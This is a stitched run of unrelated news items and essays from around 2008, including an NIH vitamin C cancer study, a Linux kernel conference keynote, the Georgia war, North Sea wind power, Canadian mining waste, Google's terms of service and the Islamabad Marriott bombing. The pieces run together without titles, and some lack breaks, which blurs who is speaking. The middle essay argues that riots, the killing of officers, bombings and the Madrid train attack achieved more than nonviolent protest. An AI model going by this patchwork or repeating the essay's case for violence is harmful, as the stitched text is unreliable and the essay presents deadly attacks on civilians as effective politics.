" When you eat foods containing more than 200 milligrams of vitamin C a day - - for example , 2 oranges and a serving of broccoli -- your body prevents blood levels of ascorbate from exceeding a narrow range , " says Mark Levine , M.D. , the study 's lead author and chief of the Molecular and Clinical Nutrition Section of the National Institute of Diabetes and Digestive and Kidney Diseases ( NIDDK ) , part of the NIH .
To bypass these normal controls , NIH scientists injected ascorbate into the veins or abdominal cavities of rodents with aggressive brain , ovarian , and pancreatic tumors .
By doing so , they were able to deliver high doses of ascorbate , up to 4 grams per kilogram of body weight daily .
" At these high injected doses , we hoped to see drug - like activity that might be useful in cancer treatment , " said Levine .
Vitamin C plays a critical role in health , and a prolonged deficiency leads to scurvy and eventually to death .
Some proteins known as enzymes , which have vital biochemical functions , require the vitamin to work properly .
Vitamin C may also act as an antioxidant , protecting cells from the damaging effects of free radicals .
The NIH researchers tested the idea that ascorbate , when injected at high doses , may have prooxidant instead of antioxidant activity .
Prooxidants would generate free radicals and the formation of hydrogen peroxide , which , the scientists hypothesized , might kill tumor cells .
In their laboratory experiments on 43 cancer and 5 normal cell lines , the researchers discovered that high concentrations of ascorbate had anticancer effects in 75 percent of cancer cell lines tested , while sparing normal cells .
In their paper , the researchers also showed that these high ascorbate concentrations could be achieved in people .
The team then tested ascorbate injections in immune - deficient mice with rapidly spreading ovarian , pancreatic , and glioblastoma ( brain ) tumors .
The ascorbate injections reduced tumor growth and weight by 41 to 53 percent .
In 30 percent of glioblastoma controls , the cancer had spread to other organs , but the ascorbate - treated animals had no signs of disseminated cancer .
" These pre-clinical data provide the first firm basis for advancing pharmacologic ascorbate in cancer treatment in humans , " the researchers conclude .
Interest in vitamin C as a potential cancer therapy peaked about 30 years ago when case series data showed a possible benefit .
In 1979 and 1985 , however , other researchers reported no benefit for cancer patients taking high oral doses of vitamin C in two double - blind , placebo - controlled clinical trials .
Several observations led the NIH researchers to revisit ascorbate as a cancer therapy .
" Clinical and pharmacokinetic studies conducted in the past 12 years showed that oral ascorbate levels in plasma and tissue are tightly controlled .
In the case series , ascorbate was given orally and intravenously , but in the trials ascorbate was just given orally .
It was not realized at the time that only injected ascorbate might deliver the concentrations needed to see an anti-tumor effect , " said Levine , who noted that new clinical trials of ascorbate as a cancer treatment are in the planning stages .
Data from Levine 's earlier studies of the regulation and absorption of dietary vitamin C were used in the revision of the Institute of Medicine 's Recommended Dietary Allowance for the vitamin in 2000 .
In the current study , Levine led a team of scientists from the NIDDK and the National Cancer Institute ( NCI ) , both components of the NIH , as well as the University of Kansas .
" NIH 's unique translational environment , where researchers can pursue intellectual high - risk , out - of - the - box thinking with high potential payoff , enabled us to pursue this work , " he said .
I was honored to give the opening keynote of the first Linux Plumbers Conference this year in Portland , Oregon .
Here 's the slides and text of my talk ( well , the text is what I intended to say , the actual words that came out probably sounded a bit different . )
I 'll comment later on a few things that I 've noticed people bringing up , but I figured it would be good to get the text and slides out for everyone to be able to see first .
The talk was recorded , and I 'll provide a link to it when it is available so you can compare it to what I have below .
If you want to link directly to this talk , please use this link .
Update : I 've responded to some of the response about this talk here .
Update 2 : The video has now been published on Google Video .
The Linux Ecosystem , what it is and where do you fit in it ?
A few months ago I gave a talk at Google about the Linux kernel development process .
During that talk , someone asked me about Canonical 's kernel contributions as they did not show up on the list that I was showing .
I offhandedly remarked that they did not show up as they had only contributed 5 - 6 patches in the past few years .
Now this comment did n't go over very well with the Ubuntu developers , and they called me out on it as they felt it was wrong .
They were right , I was wrong , so here is my public apology .
In the past 3 years , from the 2.6.15 kernel to 2.6.27 - rc6 , Canonical has had 100 patches in the Linux kernel .
I appologize about my previous statement and would like the world to know the correct number here .
But as the Canonical employees seemed so eager for me to get the number correct , let 's look a bit closer at it .
What does 100 patches really mean ?
From the 2.6.15 kernel release to the present , there have been 99324 patches made to the Linux kernel .
So , to place Canonical 's contribution into perspective , that means they did 00.10068 % of all of the kernel development for the past 3 years .
They are ranked 79th of all companies doing kernel development , with such prominate notable Linux supporters like nVidia just barely beating them out .
If Canonical was an individual contributor to the kernel , it would be in 195th place .
Their individual contributors end up placing in the following locations based on their number of contributions 251 , 714 , 1103 , 1327 , 1691 , 1691 , 2171 , 2171 , 2171 , 2171 .
Now to be fair , this is only basing things on quantity , not quality , so those 100 patches might be major contributions to the kernel , advancing the state of the art and fixing major bugs that affect thousands of people .
I 'll let all of you make that call .
And finally , lest anyone think I 'm picking on Canonical for some reason , here 's how they rank within all of the different Linux distros .
Hm , wait , I forgot one non-profit distro that I like a lot , Gentoo , let 's add them into the list :
I tried tracking Debian kernel contributions , but as most of the Debian developers do n't use a debian.org email address , it is hard , but I guessed and looked at who they list as their kernel team , combined with a few email addresses that do use a debian.org address and came up with the following best guess which is probably still not properly counting everything the Debian developers do :
Ok , that should set the record straight for how many patches Canonical has allowed their engineers to contribute back to the kernel community .
So , back to the Linux Ecosystem .
Wait , what do we mean here by " Linux " ?
When we first discussed having a Linux conference composed of kernel developers and the developers of the surrounding " base system " of programs , we had to come up with a name for all of that .
Someone proposed the term " Plumbing " , so we named the conference , the " Linux Plumbers Conference " .
Here 's a diagram of what I consider to mean the basic description of a " Linux " system :
I 've left some things out here , scripting languages that we all use to boot strap some of these programs when building them , or running startup scripts , but these programs make up the core of what a " Linux " system is .
The majority of them only run on Linux systems , while a few , gcc , binutils , make , run on all operating systems , and also make up the base of the BSDs and even openSolaris .
Let 's look at the size of these different programs , based on lines of code as measured by SLOCCOUNT from David Wheeler :
The largest is the kernel , making up 40 % overall .
That 's followed by gcc , and then X11 .
Then binutils , glibc , ALSA , and then man-pages ( we can't forget documentation ! ) .
So who is sponsering this work ?
Note , I now switched to drawing on a whiteboard , so there are no " slides " for this section , sorry , I 'll try to get a copy of the end result of the drawing in here soon .
So back to the ecosystem , what does it look like ...
Let 's start with the developer .
They create code in patch form and contribute it to the project they are working on .
Every so often the project makes a release and there are a few users that run from and help test that individual release out .
Not that many , not as many as the developers would probably like , but there are some .
Now there are lots of these individual projects as we 've just seen , and every so often a distro comes along and bundles all of these individual projects up into one unified piece , and makes a release .
There are two types of releases these days , " enterprise " and " normal " .
The " enterprise " release lasts a long time .
These packages that were taken is a snapshot in time , that is slowly maintained and updated with bug and security fixes by the developers working for the distros .
Those changes and fixes flow back into the original projects for inclusion in their main releases when possible , but for the most part , the majority of changes that go into these releases come from newer releases from the projects , so changes flow predominatly one way into the distro .
The developers working on these distros usually do n't have time for anything else , they are tasked with maintaining these distros and are burried under packaging and support tasks .
Then there are the community based distros , gentoo , debian , fedora , mandriva , slackware , and opensuse .
These move much quicker , pulling in the packages at a 6 - 8 month cycle and integrating things together .
Usually fixes flow much quicker back into the upstream packages as the developers doing this kind of work know that they need to push things upstream otherwise they will just be seeing the same problems and issues in another 6 months .
Then there are the distros that base themselves off of other distros , like ubuntu and centos .
These distros have yet another layer between them and the original developers .
Patches rarely , if ever flow backwards into an upstream distro , and the developers are very unlikely to push their changes into the upstream packages as they do n't feel the need , or do n't realize the issues involved as they rely on the upstream distro so tightly .
So what does this mean for you ?
If you are working for a company that allows you to work directly upstream on the projects that you want to , great , you 're happy , the companies are happy you are doing great work , and there is no problem .
What happens is if you are out here , working for a company that does n't allow you to contribute upstream due to internal company issues , or just a lack of time allowed due to other things .
That can be a problem for a developer who wants to contribute upstream , but can't .
The solution , quit and go work for one of the companies that allow you to do this !
Seriously , I mean it .
Right now there is a very huge scarcity in developers who know how to do this kind of work .
Lots and lots of companies are trying madly to train their internal engineers on how to work with the community , in this kind of very different development model .
They are looking for and need people that already know how to do this kind of thing .
So do n't sell yourself short at all , your skills are wanted and needed , so either tell your current employeer that you need to have the time to do this kind of upstream work , or change to a company that knows this already .

First they called on Georgia to stop the military assault on South Ossetia , then they denounced Russian aggression in Georgia .
Human rights activists in Russia are speaking up for peace and justice in the Caucasus region .
Writing for the August 11 edition of the Eurasia Daily Monitor , Jonas Bernstein reported that , “ Some veteran Russian human rights activists have criticized Russia ’s attack on Georgia unequivocally . ”
Bernstein sourced his report to the Russian news site grani.ru , which may be the most balanced news agency to report on the conflict .
Working backward from the reports at grani.ru , we find an August 7 statement posted at memo.ru , the website for the Memorial International Society founded by Sergei Kovalev .
The statement was apparently composed in the first hours of military outbreak , while the Georgian army was advancing northward toward the South Ossetian capital of Tskhinvali .
The Memorial statement reminded readers that the territory of South Ossetia was officially under the peacekeeping purview of the OSCE ( Organization for Security and Cooperation in Europe ) .
“ Georgia , as an OSCE member , has an obligation to resolve conflicts with peaceful measures , ” said the Memorial statement .
“ Restoring the territorial integrity of the government cannot be grounds for the dismissal of such responsibilities .
War operations in South Ossetia should be rapidly halted .
The path of negotiations will be long and difficult , but this is the only way can lasting peace be attained . ”
Of course , the statement did not stop the Georgian attack , and Russia soon entered the battlefield of South Ossetia from the north .
As soon as Russia expanded is military operation beyond South Ossetia , Kovalev joined a coalition of human rights activists in Georgia to denounce the aggression in strong terms .
“ We call for the immediate stop of aggression against Georgia , ” said the statement of August 10 , translated into English two days later by theotherrussia.org .
“ We consider that Russia ’s leadership , having set another bloody stain to the country ’s reputation , finally made its presence in the Group of Eight unacceptable from a moral point of view . ”
On August 11 , another statement denouncing Russian military actions came from a Russian opposition party led by Garry Kasparov .
“ Today , it is short - sighted to concentrate solely on criticism of [ Georgian President ] Saakashvili , ” said the statement by the United Civil Front ( again translated by theotherrussia.org ) .
“ To demand an immediate cease - fire and start of talks is correct , but insufficient .
If we want to eliminate the risk of repeating similar tragic situations in the future , the Russian authority must bear responsibility for its actions before its citizens . ”
Kasparov ’s party wants to hold Moscow accountable for longstanding policies that have served to perpetuate a conflict in South Ossetia .
“ As a first step , ” says the party statement , “ the president and prime - minister would do well to explain why the government is issuing tens of thousands of Russian passports in the territory of a neighboring country , with which we maintain normal diplomatic relations ?
Why are the key posts in the South Ossetian government and security services occupied by career Russian civil servants and military personnel ?
Why , after an attack on Russian peacekeepers by the superior forces of the opponent in Tskhinvali , did the official establishment stand in a state of stupor for several hours , and did n’t rush to provide military assistance ?
What does the Kremlin want to achieve by escalating the conflict with Georgia and expanding the theater of military operations ? ”
These critical words from Russian human rights activists and politicians offer a framework for peace activism in the USA .
As we read the Russian activists ’ recollections of Russian mistakes and crimes , we may find ways to join grievances against the misadventures and illegalities of our own aggressive state .
As the USA prepares to introduce a militarized humanitarian mission into Georgia , the words of Russian dissidents apply : “ Historical experience shows that the interference of our country in someone else ’s affairs inevitably , and contrary to any claims of ‘ assistance , ’ leads to innumerable misfortunes . “
Is n’t there an eerie echo for American activists in the following paragraph by Russian human rights activists ?
“ The incursion into Afghanistan led to many years of unceasing widespread violence and human rights abuses , as well as flare - ups of war again and again .
The historical development of Afghanistan turned completely around : from a secular government it turned into a theocratic one .
The actions of the Soviet leadership led to a sharp rise in the popularity of Islamic fundamentalism not only in Afghanistan , but in Pakistan and Arab countries as well .
( Remember the alliance between the Taliban and Al - Qaeda ) . ”
As our nationalist media on both sides whip up the fighting spirit in terms of either / or , Russia or USA , the level voices of Russian activists remind us : “ Politics not based on the principles of international law does not serve the true interests of the Russian people and can in no way work to resolve national - territorial conflicts in this region . ”
From a perspective of USA peace activism , ca n’t we say “ ditto ” to much of this ?

I could spend plenty of time talking about the failures of nonviolence .
Instead , it may be useful to talk about its supposed successes .
Frequently cited examples are India 's struggle for independence from British colonial rule , the U.S. civil rights movement of the 1960s , and the peace movement during the war in Vietnam .
Though they have not yet been hailed as a victory , the massive protests in 2003 against the United States ' invasion of Iraq also have been applauded by nonviolent activists .
In claiming these as victories for nonviolence , however , pacifists have engaged in a pattern of historical manipulation and whitewashing .
In India , the story goes , people led by Mahatma Gandhi built up a massive nonviolent movement over decades and engaged in protest , noncooperation , economic boycotts , hunger strikes , and other acts of disobedience that made British imperialism unworkable .
The movement suffered massacres and responded with a couple of riots , but on the whole , the movement was nonviolent and eventually won independence , providing an undeniable hallmark of pacifist victory .
The actual history is more complicated .
Many violent pressures also influenced the British decision to withdraw .
The British had lost the ability to maintain colonial power after losing millions of troops and resources during two extremely violent world wars .
The armed struggles of Arab and Jewish militants in Palestine from 1945 to 1948 further weakened the British Empire , and these conflicts served as a clear threat of what might result if the Indians gave up civil disobedience to take up arms en masse .
India 's resistance to British colonialism included enough militancy that the Gandhian method should be viewed most accurately as one of several competing forms of popular resistance .
Pacifists white out those other forms of resistance , ignoring important militant leaders such as Chandrasekhar Azad , who fought in armed struggle against the British colonizers , and revolutionaries such as Bhagat Singh , who won mass support for bombings and assassinations as part of a struggle to accomplish the ' overthrow of both foreign and Indian capitalism . '
The pacifist history of India 's struggle cannot make any sense of the fact that Subhas Chandra Bose , the militant candidate , was twice elected president of the Indian National Congress , in 1938 and 1939 .
Ultimately , the liberation movement in India failed .
The British were not forced out .
Under pressure from a diverse resistance , they chose to hand power over to the parts of the resistance they felt would best uphold their interests , shifting from direct colonial rule to neocolonial rule .
What kind of victory allows the losing side to dictate the time and manner of the victors ' ascendancy ?
The British continued to fan the flames of religious and ethnic separatism so that India would be divided against itself , prevented from gaining peace and prosperity , and dependent on military aid and other support from Euro / American states .
Independence from colonial rule has given India more autonomy in a few areas , and it has certainly allowed a handful of Indians to sit in the seats of power .
But the exploitation and the commoditization of the commons and of culture have deepened .
Moreover , India lost a clear opportunity for meaningful liberation from a foreign oppressor .
Any liberation movement now would have to go up against the confounding dynamics of nationalism and ethnic / religious rivalry in order to abolish a domestic capitalism and government that are far more developed .
The U.S. civil rights movement is one of the most important episodes in pacifist history .
Across the world , people see it as an example of nonviolent victory .
In truth , it was neither nonviolent nor a victory .
On the contrary , though pacifist groups such as Martin Luther King Jr.'s Southern Christian Leadership Conference had considerable power and influence , popular support , especially among poor black people , gravitated toward militant revolutionary groups such as the Black Panther Party .
According to a 1970 Harris poll , 66 percent of African Americans said the activities of the Black Panther Party gave them pride , and 43 percent said the party represented their own views .
The nonviolent segments of the civil rights movement cannot be distilled and separated from its revolutionary parts .
Pacifist , middle - class black activists , including King , got much of their power from the specter of black resistance and the presence of armed black revolutionaries .
To cite one example :
In the spring of 1963 , King 's Birmingham campaign was fixing to be a repeat of the dismally failed action in Albany , Georgia , where a nine - month civil disobedience campaign that began in 1961 had demonstrated the powerlessness of nonviolent protesters against a government with seemingly bottomless jails .
Then , on May 7 , after continued police violence in Birmingham , 3,000 black people began fighting back , pelting the police with rocks and bottles .
Just two days later , Birmingham -- up until then an inflexible bastion of segregation -- agreed to desegregate downtown stores , and President Kennedy backed the agreement with federal guarantees .
Within days , after local white supremacists bombed a black home and a black business , thousands of black people rioted again , seizing a nine - block area , destroying police cars , injuring several cops ( including the chief inspector ) , and burning white businesses .
Within weeks , Kennedy ended several years of stalling and called for Congress to pass the Civil Rights Act .
As King himself said , ' The sound of the explosion in Birmingham reached all the way to Washington . '
In short , the largest victory of the civil rights movement came when black people demonstrated that they would not remain peaceful forever .
Faced with the two alternatives , the white power structure chose to negotiate with the pacifists , and we have seen the results :
The movement was successful in ending de jure segregation and expanding the minuscule black petty bourgeoisie , but fell far short of full political and economic equality , to say nothing of black liberation from white imperialism .
People of color still have lower average incomes , poorer access to housing and health care , and poorer health than white people .
De facto segregation still exists .
Political equality is also lacking .
Millions of voters , most of them black , are disenfranchised ( from voting for white candidates in a white political system that reflects a white culture ) when it is convenient to ruling interests , and only three black senators have served since Reconstruction .
The claim that the U.S. peace movement ended the war in Vietnam contains the usual set of flaws .
With unforgivable self - righteousness , peace activists ignore the fact that 3 million to 5 million Indochinese died in the fight against the U.S. military ; tens of thousands of U.S. troops were killed and hundreds of thousands wounded ; other troops were demoralized and had become ineffective and openly rebellious ; and the United States was losing political capital ( and going fiscally bankrupt ) to a point where pro-war politicians began calling for a strategic withdrawal .
Some pacifists claim that the huge number of conscientious objectors who refused to fight points to a nonviolent victory .
But far more significant than passive conscientious objectors were the active rebellions by black , Latino , and Native American troops .
The government 's plan , in response to black urban riots , of taking unemployed young black men off the streets and into the military , backfired .
Fragging , sabotage , refusal to fight , rioting in the stockades , and aiding the enemy contributed significantly to the decision to pull out ground troops .
The Pentagon estimated that 3 percent of officers and noncommissioned officers killed in Vietnam from 1961 to 1972 were killed by their own troops .
In many instances , soldiers in a unit pooled their money to raise a bounty for the killing of an unpopular officer .

' By every conceivable indicator , our army that now remains in Vietnam is in a state approaching collapse , ' wrote Marine Corps Colonel Robert D. Heinl in the Armed Forces Journal in June 1971 , ' with individual units avoiding or having refused combat , murdering their officers and noncommissioned officers , drug - ridden and dispirited where not near mutinous .
Elsewhere than Vietnam , the situation is nearly as serious . '
Although they were less politically significant than resistance from within the military , bombings and other acts of violence in protest of the war on white college campuses should not be ignored in favor of the pacifist whitewash .
In the 1969 - 70 school year ( September through May ) , a conservative estimate counts 174 antiwar bombings on campuses and at least 70 off - campus bombings and other violent attacks targeting ROTC buildings , government buildings , and corporate offices .
Additionally , 230 campus protests included physical violence , and 410 included damage to property .
In conclusion , what was a very limited victory -- the withdrawal of ground troops after many years of warfare -- can be most clearly attributed to two factors : the successful and sustained violent resistance of the Vietnamese , and the militant and often lethal resistance of the U.S. ground troops themselves .
The domestic antiwar movement clearly worried those in power , but it had certainly not become powerful enough that we can say it ' forced ' the government to do anything , and in any case , its most forceful elements used violence .
Perhaps confused by their own false history of the peace movement during the Vietnam War , pacifist organizers against the invasion of Iraq seemed to expect a repeat of a victory that never happened .
On February 16 , 2003 , as the U.S. government moved toward war with Iraq , Agence France - Presse hailed weekend protests as 'a stinging rebuke to Washington and its allies . '
The protests were the largest in history ; excepting a few minor scuffles , they were entirely nonviolent .
United for Peace and Justice and some other antiwar groups even suggested that the protests might avert war .
As we now know , they were totally wrong , and the protests were totally ineffective .
The invasion occurred as planned , despite the millions of people nominally , peacefully , and powerlessly opposed to it .
The antiwar movement did nothing to change the power relationships in the United States .
President Bush received substantial political capital for invading Iraq , and was not faced with a backlash until the war and occupation effort began to show signs of failure due to the effective armed resistance of the Iraqi people .
A good case study regarding the efficacy of nonviolent protest can be seen in Spain 's involvement with the U.S. - led occupation .
Spain , with 1,300 troops , was one of the larger junior partners in the ' Coalition of the Willing . '
More than a million Spaniards protested the invasion , and 80 percent of the Spanish population was opposed to it , but their commitment to peace ended there ; they did nothing to actually prevent Spanish military support for the invasion and occupation .
Because they remained passive and did nothing to disempower the leadership , they remained as powerless as the citizens of any democracy .
Not only was Prime Minister Aznar allowed to go to war , he was expected by all forecasts to win reelection .
Until the bombings .
On March 11 , 2004 , just days before the voting booths opened , multiple bombs planted by an al - Qaida - linked cell exploded on Madrid trains , killing 191 people and injuring 1,755 .
Directly because of this , Aznar and his party lost in the polls , and the Socialists , the major party with an antiwar platform , were elected to power .
The U.S. - led coalition shrunk with the loss of the Spanish troops .
Whereas millions of peaceful activists voting in the streets like good sheep have not weakened the brutal occupation in any measurable way , a few dozen terrorists willing to slaughter noncombatants were able to cause the withdrawal of more than a thousand occupation troops .
So much for the victories of pacifism .
The Madrid bombings do not present an example for action , but rather , an important paradox :
Do people who stick to nonviolent tactics that have not proved effective in ending the war against Iraq really care more for human life than the Madrid terrorists ?
From India to Birmingham , nonviolence has failed to sufficiently empower its practitioners , whereas the use of a diversity of tactics got results .
Put simply , if a movement is not a threat , it cannot change a system that is based on centralized coercion and violence .
Time and again , people struggling not for some token reform but for complete liberation -- the reclamation of control over our own lives and the power to negotiate our own relationships with the people and the world around us -- will find that nonviolence does not work , that we face a self - perpetuating power structure that is immune to appeals to conscience and strong enough to plow over the disobedient and uncooperative .
We must reclaim histories of resistance to understand why we have failed in the past and how exactly we achieved the limited successes we did .
We must also accept that all social struggles , except those carried out by a completely pacified and thus ineffective people , include a diversity of tactics .

The EU is studying plans for a transnational power grid in the North Sea that could provide electricity from renewable sources for 70 m homes .
It could cost up to € 20bn ( £ 16 bn ) to install .
The proposed 3,850 mile offshore grid would connect more than 100 wind farms , containing 10,000 turbines , to seven North Sea countries - Britain , Belgium , Denmark , France , Germany , the Netherlands and Norway .
Senior EC energy officials yesterday gave a warm but guarded welcome to the plans , which were submitted by eco-campaigners Greenpeace and drawn up by environment consultants 3E , calling them " ambitious but realistic " .
The EU is committed to cutting greenhouse gases by 20 % , producing 20 % of primary energy from renewables and reducing energy consumption by 20 % - the so - called 20/20/20 package - by 2020 .
The plans , on the agenda again in November , have run into serious difficulties among governments and MEPs .
A senior EC official said the package meant a third of Europe 's electricity would come from renewables by 2020 , with a third of that from wind power - and a third of the wind power from offshore .
The report , based on identified projects , assumes that 68.4 gigawatts of capacity at 118 wind farms will have been established in the North Sea by 2020 - 30 and could provide 13 % of the annual electricity consumption of the seven countries .
A recent European Wind Energy Association strategy paper estimated installed capacity , on land and offshore , could rise to 300GW by 2030 - accounting for 28 % of power generation in the EU and a quarter of consumption , saving 600 m tonnes of CO2 .
Yesterday 's report using scientific data on wind speeds , suggests that the power output of wind farms could be stabilised within an integrated grid and supplemented by Scandinavian hydropower that can be easily switched on .
The variability of wind speeds and , hence , of output has been a drawback of wind power .
" The grid would enable the efficient large - scale integration of renewable energy in the power system across the whole North Sea region , " said Frauke Thies , a Greenpeace campaigner .
" A dip in wind power in one area could be ' balanced ' by higher production in another area , even hundreds of kilometres away . "
Greenpeace estimates the cost of the scheme at between € 15bn and € 20bn but says it would unlock power trading opportunities and cost efficiency .
A new 600 km - power line between Norway and the Netherlands , it says , cost €600 m to build but generates € 800,000 in daily trading .
It argues that such a scheme , boosted by other renewables such as tidal , wave energy and biomass , would eradicate the need for further investment in coal and nuclear .
But EU officials are sceptical , suggesting that " clean " coal and nuclear are essential .
" We do n't share the view that these are incompatible with renewables , " one said .

Canada ’s political parties need to put the issue of toxic waste from the country ’s mining industry on their agendas for the federal election campaign , an Ottawa - based environmental group said Monday .
Mining Watch Canada said many Canadian mines and quarries do not disclose the full extent of toxins found in the millions of tonnes of tailings and waste rock they produce .
In 2007 , three environmental organizations — including Mining Watch — went to court to try to make federal environmental regulators force full disclosure of toxic substances found in tailings and waste rock .
The Mining Association of Canada ( MAC ) , which represents the industry , said mines do disclose all toxic material discharged into the environment by their processing .
The association said the issue of releasing information about tailings is being complicated by the court case .
" It ’s their legal action that has prevented resolution of this issue , " said Justyna Laurie - Lean of the MAC .
" There has been a process going on to resolve this . "
Environment Canada changed the rules on reporting pollution discharges from mines in 2006 , but the change has n’t resulted in full disclosure of potential toxins found in tailings and waste rock from mines , according to Catherine Coumans of Mining Watch .
Now , in the run-up to the Oct. 14 election , is the time for political parties to start highlighting the issue , she said .
" The Green Party has picked this up on its website , but we do n’t see much else happening , " Coumans told CBC News .
Rock from quarries , gravel pits included : MAC
She said that if Canadians knew how much poisonous material was found in mine tailings and waste rock , they would be shocked .
" If it was [ fully ] reported , it would immediately be the large single source of toxins in Canada , " Coumans said .
" It would dwarf the amount of toxins produced by municipal waste and all other industries put together . "
But Laurie - Lean of the Mining Association said it ’s misleading to lump together tailings from all of Canada ’s extractive industries , including gravel pits and quarries .
" These are extractive industries for which there is no processing on site , " she said .
" They produce large quantities of rock and some may have elevated levels of [ substances ] of concern , some may not . "
Since 1998 , U.S. regulations have required mines to disclose all potentially harmful substances released by the extraction process , including harmful substances in tailings .
Concern for the environment emerged as the second - most important issue to Canadians in a recent CBC - Environics opinion poll , behind health care .
Federal Environment Minister John Baird said he wo n’t comment on the specifics of the toxins disclosure issue but he ’s happy with the regulations in place now .
" I believe in tough environmental law , aggressive enforcement and public participation and knowledge , " Baird said .
" Some of that ’s done federally and some of that ’s done provincially .
I think that ’s a good thing . "
Mining contributes nearly four per cent of Canada ’s gross domestic product , and mined natural resources are among the country ’s most important exports .
Google last week removed some language in its Chrome browser ’s terms of service that gave the company a license to any material displayed in the browser , but that language remains in several other Google products , including its Picasa photo service and its Blogger service .
The language came from Google ’s universal terms of service , the default license agreement for Google products .
The provision in the license agreement states that Google users retain the copyright to the content they post into a Google product , but then says , “ By submitting , posting or displaying the content you give Google a perpetual , irrevocable , worldwide , royalty - free , and non-exclusive licence to reproduce , adapt , modify , translate , publish , publicly perform , publicly display and distribute any Content which you submit , post or display . ”
Similar language exists in terms of service for Picasa , Blogger , Google Docs and Google Groups .
It does not exist in Gmail and no longer exists in Chrome .
The provisions raise security as well as privacy questions , said Randy Abrams , director of technical education at Eset , a cybersecurity vendor .
“ I would n’t do anything that was personally sensitive or security - sensitive with most any Google product , ” he said .
Google removed the language from Chrome one day after launching the browser , following an outcry about the copyright implications of it asserting a license for everything posted or displayed in the browser .
In some cases , Google needs the license to display content , Mike Yang , Google ’s senior product counsel , said in a blog post .
“ To be clear : our terms do not claim ownership of your content — what you create is yours and remains yours , ” Yang wrote .
“ But in lawyer - speak , we need to ask for a ‘ license ’ ( which basically means your permission ) to display this content to the wider world when that ’s what you intend . ”
Several critics questioned whether that language was appropriate in other applications provided by Google .
Google seems to be going in two different directions with these licensing terms , Abrams said .
“ One thing is to abide by their ‘ do no evil ’ creed , but also claim as many rights as possible , ” he said .
“ This is a typical corporate response :
Try to get as much as you can and back off if forced to . ”
Yang also noted that similar language exists in the terms of service at several Web sites , including Amazon.com , eBay and Facebook .
And the next sentence in that copyright provision limits what Google could do with a picture posted on the Picasa service or a blog post in Blogger , he said .
It reads as follows : “ This licence is for the sole purpose of enabling Google to display , distribute and promote the Services and may be revoked for certain Services as defined in the Additional Terms of those Services . ”
Yang , in an interview , said terms of service that may be needed for a Web site to display content may not be appropriate for other applications .
Google “ goofed ” in putting the copyright language in Chrome , and the company is reviewing that copyright language in some of its other products , he said .
“ There ’s no intent on our part to assert any sort of license for all the stuff users push to and from the Internet , ” Yang said .
“ [ The universal terms of service ] is a pretty broad license , but only to the extent that we need it to provide you with the services . ”
However , the copyright terms that still exist in Picasa , Blogger and other Google applications would allow the company to use its customers ’ content to promote the Google service .
That could allow Google to use the content in live product demonstrations , for example , or in some promotional materials , Yang said .
Asked whether Google could take user content and use it in an advertising campaign without their permission , Yang said internal Google policies would probably prevent the company from doing it .
Google would n’t sell user content without permission , he added .
Andrew Flusche , a Fredericksburg , Va. , lawyer who focuses on copyright and other issues , questioned how internal Google policy would guarantee protection of the end -users .
“ Google ’s internal policy can change any time ; it ’s their policy , ” Flusche said .
“ The only protection users have is what the EULA [ end user license agreement ] says . ”
The user agreement could allow Google to “ publish a full - color book of Picasa photos as a promotional product , ” he added .
Google is correct when it says many Web sites have similar copyright provisions , he added .
“ But that does n’t mean anything , ” Flusche said .
“ The terms are still unfavorable to users ; that ’s the dynamic of a huge corporation and millions of end -users . ”
However , Google would mostly likely be careful with its use of user content to promote its products , given that there ’s little upside in doing so , said Josh King , vice president for business development at general counsel at Avvo.com , a legal advice site .
“ While the rights they ’ve reserved themselves are very broad , it ’s probably a case of their actual practice being more conservative , ” King said .
“ We just have to hope they maintain their stance of not being evil . ”
Enlarge By Anjum Naveed , AP Pakistan army troops arrive to conduct a rescue operation at the site of Saturday 's massive truck bombing at Marriott hotel in Islamabad , Pakistan , Sunday .
The bombing devastated the luxury hotel in Pakistan 's capital , killing some 40 people and injuring more than 250 .
ISLAMABAD , Pakistan  Pakistan on Sunday rejected a U.S. offer to help investigate the weekend suicide bombing that killed at least 53 people and destroyed the Islamabad Marriott , this capital city 's best - known hotel .
" We do not need help .
We are competent .
We reject it , " Interior Ministry adviser Rehman Malik told reporters Sunday after the U.S. offered FBI help in pursuing the terrorists behind the attack .
The Marriott bombing is the latest in a series of terrorist attacks across Pakistan and will likely intensify debate within the country over Pakistani support for the U.S. war on terror , says Samina Ahmed , South Asia director for the conflict prevention , non-profit International Crisis Group .
VIDEO : Moments before Pakistan blast HOTEL BLAST : Change of plans could saved Pakistani leaders " This strengthens those voices who say this is not our war , " she says .
Indeed , Maulana Fazal ur Rehman of the religious political party Jamiat Ulema Islam , part of the governing coalition , called Sunday for the country to drop former president Pervez Musharraf 's policy of allying with the United States against the militants .
Rescuers continued to pull charred bodies from the wreckage , and fires continued to burn inside the hotel Sunday .
The attack on the heavily guarded , five - star hotel seemed designed to kill as many people as possible , Ahmed said .
It occurred just after 8 p.m. Sunday when the hotel 's popular restaurants were packed with Muslims just finishing their daytime fasting for the Ramadan holiday .
" It was a cowardly act of terrorism in this holy month of Ramadan , " Prime Minister Yousuf Raza Gilani said .
He announced a 10 million rupee ( $ 143,000 ) reward for information on the attack .
Law Minister Farooq Naik called the attack Pakistan 's 9/11 .
The government released surveillance camera footage showing the attack .
A suicide bomber at the wheel of a dump truck opened fire at Marriott security guards who refused to let him into the parking lot .
He then detonated himself and started a small fire .
The guards spent four minutes trying to extinguish the blaze when another , much bigger explosion went off .
The truck had been carrying 1,300 pounds of explosives – making it the most powerful bomb terrorists have ever used in Pakistan , Malik said .
The second blast left a crater 24 feet deep and 59 feet wide .
At least 53 people died , including two Americans and the Czech ambassador who lived at the hotel .
The Marriott attack came exactly one year after al - Qaeda terrorist leader Osama bin Laden called for Muslims to wage holy war against the Pakistani government .
The Marriott was an oasis of civility for foreign diplomats and journalists assigned to Pakistan and for wealthy Pakistanis , who came for afternoon tea or sumptuous buffets at the Nadia restaurant .
Like the Jan.14 attack on the five - star Serena hotel in the Afghan capital Kabul , it seemed designed to show that the militants could strike even the most heavily guarded targets in Pakistan and Afghanistan .
" It is horrific , " Ahmed said .
The Islamabad Marriott was attacked once before .
In January 2007 , a security guard blocked a suicide bomber , who detonated himself , killing the guard and wounding seven others .
Malik said he suspected Saturday 's Marriott attack would be traced back to militants operating from the lawless tribal areas on Pakistan 's northwest frontier with Afghanistan .
" All roads lead to to South Waziristan , " a militant hotbed in the tribal areas , he said .
The Taliban and their al - Qaeda allies regrouped in Pakistan 's tribal areas after being driven from Afghanistan by U.S. forces following the 9/11 terrorist attacks on Washington and New York .
They have been crossing the border and launching attacks on U.S. and NATO forces defending the pro-U.S. government of Afghan President Hamid Karzai .
